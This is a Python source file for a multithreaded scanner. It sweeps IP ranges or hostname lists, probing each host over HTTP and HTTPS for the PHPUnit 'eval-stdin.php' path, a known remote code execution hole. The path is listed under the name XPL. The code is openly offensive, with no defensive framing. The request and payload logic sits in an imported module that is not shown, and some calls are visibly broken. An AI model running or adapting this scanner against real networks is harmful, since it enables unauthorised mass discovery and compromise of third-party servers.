from modules import file_module, request_module
import time
from concurrent.futures import ThreadPoolExecutor

XPL = [
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
]


class Executor:
    def __init__(self) -> None:
        self.MAX_CONECTION_THREAD = 60
        self.COUNT_REQUEST = 0
        self.TIME_SLEEP = 3
        self.TIME_OUT = 5
        self.COUNT_ROX = 0
        self.req_obj = request_module.ScannerRequests()

    def checker(self, target):
        for xpl in XPL:
            expl  = 'http://' + target + xpl
            expl_https = 'https://' + target + xpl
            result = self.req_obj.send_requests(expl)
            time.sleep(self.TIME_SLEEP)
            if result:
                return result
    
    def checker_https(self, target):
        for xpl in XPL:
            expl_https = 'https://' + target + xpl
            result = self.req_obj.send_requests(expl_https)
            time.sleep(self.TIME_SLEEP)
            if result:
                return result

    def ip_ranger(self, start_ip, end_ip):
        start = list(map(int, start_ip.split(".")))
        end = list(map(int, end_ip.split(".")))
        temp = start
        ip_range = []
        ip_range.append(start_ip)
        while temp != end:
            start[3] += 1
            for i in (3, 2, 1):
                if temp[i] == 256:
                    temp[i] = 0
                    temp[i-1] += 1
            ip_range.append(".".join(map(str, temp)))
        return ip_range


    def start_from_ip(self,ip_start, ip_end):
        try:
            IP_RANGE = self.ip_ranger(ip_start, ip_end)
            exxec = ThreadPoolExecutor(max_workers=self.MAX_CONECTION_THREAD)
            exxec.map(self.checker, IP_RANGE)
            exxec.map(self.checker_https)
            exxec.shutdown(wait=True)
        except Exception as e:
            return print(e)

    def start_urls(self, list_hostnames):
        try:
            exxec = ThreadPoolExecutor(max_workers=self.MAX_CONECTION_THREAD)
            exxec.map(self.checker, list_hostnames)
            exxec.map(self.checker_https)
            exxec.shutdown(wait=True)
        except Exception as e:
            return print(e)
